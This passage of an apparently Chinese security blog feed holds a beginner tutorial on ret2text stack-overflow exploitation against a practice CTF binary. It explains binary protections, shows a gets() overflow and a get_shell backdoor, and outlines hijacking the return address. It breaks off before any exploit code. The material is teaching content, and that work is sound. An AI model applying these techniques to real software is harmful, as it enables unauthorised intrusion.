&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/2.4/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Compiling and Installing - Apache HTTP Server Version 2.4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/mhaskar/Octopus/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>蹲点神器GitHub-CVE-Listener安利</title>
        <link>https://kira-pgr.github.io/posts/gcl/</link>
        <pubDate>Tue, 22 Feb 2022 21:18:34 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/gcl/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/gcl/cover.jpg" alt="Featured image of post 蹲点神器GitHub-CVE-Listener安利" /&gt;&lt;h1 id=&#34;github-cve-listener---无需服务器的github漏洞利用工具实时推送&#34;&gt;Github-CVE-Listener&amp;mdash;无需服务器的GitHub漏洞利用工具实时推送&lt;/h1&gt;
&lt;p&gt;没错= = 我来&lt;del&gt;厚颜无耻地&lt;/del&gt;安利我自己写的工具了&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;项目地址&#34;&gt;项目地址&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Kira-Pgr/Github-CVE-Listener&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Kira-Pgr/Github-CVE-Listener&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;功能&#34;&gt;功能&lt;/h2&gt;
&lt;p&gt;无需服务器的GitHub漏洞利用工具实时推送(目前支持推送到TG/微信)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 100; 
			flex-basis: 241px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/gcl/1.jpg&#34; data-size=&#34;711x706&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/gcl/1.jpg&#34;
			width=&#34;711&#34;
			height=&#34;706&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/gcl/1_hub867c1e5d1af1a5a83f917f6cd0b061e_348427_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/gcl/1_hub867c1e5d1af1a5a83f917f6cd0b061e_348427_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Telegram&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Telegram&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 56; 
			flex-basis: 135px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/gcl/2.jpg&#34; data-size=&#34;1080x1909&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/gcl/2.jpg&#34;
			width=&#34;1080&#34;
			height=&#34;1909&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/gcl/2_hu13d6b793998fabd5a317d55475851319_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/gcl/2_hu13d6b793998fabd5a317d55475851319_391390_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;微信&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;微信&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用方法&#34;&gt;使用方法&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Kira-Pgr/Github-CVE-Listener/blob/main/README_ZH.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Kira-Pgr/Github-CVE-Listener/blob/main/README_ZH.md&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;项目特点&#34;&gt;项目特点&lt;/h2&gt;
&lt;p&gt;目前其他的GitHub监听器都需要依赖自己的服务器来运行，本Project使用&lt;strong&gt;GitHub Actions&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;运行，不需要依赖其他任何环境(即使你没有电脑也可以使用) :)&lt;/p&gt;
&lt;p&gt;&lt;del&gt;对于像我这种没有服务器的人比较友好啊&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;补充&#34;&gt;补充&lt;/h2&gt;
&lt;p&gt;如果你拥有服务器并希望在服务器跑的话可以使用&lt;a class=&#34;link&#34; href=&#34;https://github.com/yhy0/github-cve-monitor&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;另一个优秀的项目&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PWN! PWN! PANG! Part4 --- ret2text</title>
        <link>https://kira-pgr.github.io/posts/pwn4/</link>
        <pubDate>Thu, 10 Feb 2022 22:54:20 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/pwn4/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn4/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part4 --- ret2text" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part4&#34;&gt;PWN! PWN! PANG! Part4&lt;/h1&gt;
&lt;h2 id=&#34;必须有的前言&#34;&gt;必须有的前言&lt;/h2&gt;
&lt;p&gt;从Part4开始我们就要正式进入实战部分了哦qaq,&lt;/p&gt;
&lt;p&gt;本篇文章主要讲述最最简单的一种栈溢出利用姿势&lt;strong&gt;ret2text&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;资料投放__&#34;&gt;资料投放&amp;gt;__&amp;lt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/EYfbZCQ5bYlNmkY7tEKqHkkB6xhh7qXUlfdzvU1fu_f6jw?e=eOg9Ak&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;IDA Pro 7.5&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Ea4xaVYyrXhGpe-xicuoxJsBGZNUXe3FFg2zpc5tHVYi-A?e=QManqf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ret2text题目&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快&lt;strong&gt;且可以脱离客户端&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;补充知识点linux程序安全保护机制&#34;&gt;补充知识点：Linux程序安全保护机制&lt;/h2&gt;
&lt;h3 id=&#34;aslr-地址随机化技术&#34;&gt;ASLR: 地址随机化技术&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;全名: Address Space Layout Randomization&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统的保护措施, 和程序没有关系, &lt;strong&gt;一般默认目标机器随机化完全开启&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以通过&lt;code&gt;cat /proc/sys/kernel/randomize_va_space&lt;/code&gt;查看系统保护的开启情况&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ASLR选项:&lt;/p&gt;
&lt;p&gt;0 关闭&lt;/p&gt;
&lt;p&gt;1 半随机 共享库 栈 mmap()分配的堆空间以及VDSO将被随机化&lt;/p&gt;
&lt;p&gt;2 全随机 brk()分配的堆空间也被虚拟化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;pie-随机化elf文件映射地址&#34;&gt;PIE: 随机化ELF文件映射地址&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;好饿，想吃馅饼了  雾)&lt;/del&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;全名: Position-Independent Executable&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;程序的防护措施，编译时生效&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;检测程序防护措施的方法:PWNTools的checksec模块&lt;/p&gt;
&lt;p&gt;详细使用技巧见下文&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;开启 ASLR 之后，PIE 才会生效&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;the-nx-bitsnx-栈不可执行&#34;&gt;The NX bits(NX): 栈不可执行&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;栈为什么要不可执行呢?  &lt;del&gt;小问号你是否有很多小朋友???&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;从前面的知识中可以了解到，攻击者可以通过栈溢出劫持程序执行流，强迫程序执行制定地址的内容&lt;/p&gt;
&lt;p&gt;而如果恰好攻击者在栈中写入了shellcode(指执行后可以直接拿到shell的代码)，就可以通过直接执行栈中写入的shellcode来getshell&lt;/p&gt;
&lt;p&gt;所以，为了防范攻击者这么轻易就能做坏事= =  &lt;strong&gt;The NX bits&lt;/strong&gt;就诞生了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;全名: the No-eXecute bits&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;程序与操作系统的防护措施，编译时决定是否生效(也就意味着可以通过checksec查看)，由操作系统实现&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实现: 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 191; 
			flex-basis: 458px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/NX.png&#34; data-size=&#34;965x505&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/NX.png&#34;
			width=&#34;965&#34;
			height=&#34;505&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;关于内存中的ELF各部分的权限&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;关于内存中的ELF各部分的权限&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;canary-金丝雀--专门针对栈溢出的防护&#34;&gt;Canary &lt;del&gt;(金丝雀)&lt;/del&gt; : 专门针对栈溢出的防护&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;程序的防护措施，编译时生效&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本上Canary开启我们就不采用栈溢出的思路&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实现:在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;canary长度为1字长，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;relro-重定位信息不可写&#34;&gt;RELRO: 重定位信息不可写&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;全名: RELocate Read-Only&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;程序的防护措施，编译时生效&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分为关闭RELRO，部分RELRO(目前是gcc默认), 完全RELRO&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在本系列文章中不讲解，如果有兴趣可以去看&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/ylcangel/article/details/102625948&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pwn-pwn-pang&#34;&gt;PWN? PWN! PANG!&lt;/h2&gt;
&lt;h3 id=&#34;前期准备&#34;&gt;前期准备&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;下载好所需文件(IDA, 目标程序ret2text)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在ret2text相同目录下打开终端&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;准备好一个Windows系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;确保ret2text文件可以执行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ll
chmod +x ret2text
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看保护开启情况&#34;&gt;查看保护开启情况&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;checksec ret2text
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;至于checksec用法嘛= =    checksec 文件名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/kali/Sec/PWN/Stack/ret2text&amp;#39;&lt;/span&gt;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看见这是一个32位程序，开启了NX&lt;/p&gt;
&lt;h3 id=&#34;反汇编分析&#34;&gt;反汇编分析&lt;/h3&gt;
&lt;p&gt;因为IDA是win平台的，所以我们就得先请出一只无辜的Windows&lt;/p&gt;
&lt;p&gt;将ret2text拖到 &lt;code&gt;ida.exe&lt;/code&gt; 上打开&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果是64位程序，则选择 &lt;code&gt;ida64.exe&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;同意使用协议&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 88; 
			flex-basis: 213px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/l.png&#34; data-size=&#34;538x605&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/l.png&#34;
			width=&#34;538&#34;
			height=&#34;605&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;协议&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;协议&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;选择第一个(默认配置)然后ok&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 127; 
			flex-basis: 307px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/1.png&#34; data-size=&#34;581x454&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/1.png&#34;
			width=&#34;581&#34;
			height=&#34;454&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;嘛= =&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;嘛= =&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;双击左栏main进入主函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;TIP:  如你界面和我不相同请按空格键切换&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 201; 
			flex-basis: 482px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/main.png&#34; data-size=&#34;1602x797&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/main.png&#34;
			width=&#34;1602&#34;
			height=&#34;797&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;主函数的反汇编&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;主函数的反汇编&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;汇编看着太难受了? 按下F5即可看到c代码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Tip: 别忘了Fn键哦.qaq&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;思路分析&#34;&gt;思路分析&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Have you heard of buffer overflow?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;vulnerable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;It seems that you know nothing about it ......&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们看到它调用了一个vulnerable函数  &lt;strong&gt;&lt;del&gt;(这也太明显了吧 = = )&lt;/del&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;查看那个 &lt;del&gt;欠揍的函数&lt;/del&gt; 代码，可以看见明显的一个漏洞&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vulnerable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [esp+8h] [ebp-10h] BYREF
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它使用&lt;code&gt;gets()&lt;/code&gt;读入局部变量&lt;code&gt;buffer[8]&lt;/code&gt;,由于&lt;code&gt;gets()&lt;/code&gt;不检查输入长度，所以就可以读入过长数据造成栈溢出&lt;/p&gt;
&lt;p&gt;仔细观察左侧函数列表，&lt;code&gt;get_shell()&lt;/code&gt;引起了我们的注意&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好家伙，直接双手呈上shell= =,&lt;/p&gt;
&lt;p&gt;这看起来是某个程序员为了方便自己 &lt;del&gt;奇奇怪怪的意图&lt;/del&gt; 调试程序干的&amp;lt;好&amp;gt;事, 在程序了直接留下一个后门&lt;/p&gt;
&lt;p&gt;现在我们的思路应该很清晰了，就是通过栈溢出篡改函数返回地址，劫持程序执行流，让其调用&lt;code&gt;get_shell()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 177; 
			flex-basis: 426px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/s.png&#34; data-size=&#34;986x555&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/s.png&#34;
			width=&#34;986&#34;
			height=&#34;555&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/s_hu9786b2549c7d9b9bfe806264788a882a_29606_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/s_hu9786b2549c7d9b9bfe806264788a882a_29606_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;把思路用图片的形式解释下吧.qaq&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;把思路用图片的形式解释下吧.qaq&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;精心构造恶意数据&#34;&gt;精心构造恶意数据&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 209; 
			flex-basis: 503px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/of.png&#34; data-size=&#34;877x418&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/of.png&#34;
			width=&#34;877&#34;
			height=&#34;418&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/of_hu265d6c91663920ba0b132793828898e6_26788_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/of_hu265d6c91663920ba0b132793828898e6_26788_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;栈溢出发生时栈帧的情况(32位程序)&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;栈溢出发生时栈帧的情况(32位程序)&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;既然要溢出，那么我们要溢出多少才可以呢？&lt;/p&gt;
&lt;p&gt;观察上面的图片,我们可以发现，我们首先要用垃圾数据把局部变量空间(因具体情况而定)和&lt;code&gt;prev ebp&lt;/code&gt;的空间(32位4字节.64位8字节)填满，&lt;strong&gt;然后再加上&lt;code&gt;get_shell()&lt;/code&gt;的地址覆盖返回地址&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;计算所需垃圾数据长度方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过IDA的注释获取(不一定准确)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在IDA对于受害者函数的反编译代码中，有这样一句&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [esp+8h] [ebp-10h] BYREF
